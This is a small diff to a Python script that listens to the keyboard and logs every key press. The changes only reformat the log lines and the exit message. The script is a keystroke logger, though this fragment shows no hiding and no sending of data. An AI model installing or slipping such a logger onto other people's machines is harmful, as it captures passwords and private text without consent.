@@ -10,7 +10,7 @@ handlers = [
 ]
 logging.basicConfig(
   level=logging.INFO,
-  format='[%(asctime)s] %(levelname)s [%(name)s] %(message)s',
+  format='[%(asctime)s] %(levelname)s [%(name)s] Key pressed %(message)s',
   datefmt='%Y-%m-%d %H:%M:%S %Z',
   handlers=handlers
 )
@@ -18,9 +18,9 @@ logger = logging.getLogger(__name__)
 
 def on_press(key):
   try:
-    logger.info(f'Key pressed {key.char!r}')
+    logger.info(f'{key.char}')
   except AttributeError:
-    logger.info(f'Key pressed {key!r}')
+    logger.info(f'{key}')
 
 def on_release(key):
   #logger.info(f'Key {key} released')
@@ -33,7 +33,7 @@ def main():
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
       listener.join()
   except:
-    logger.info('before exit')
+    logger.info('EXIT')
     exit()
 
 if __name__ == '__main__':
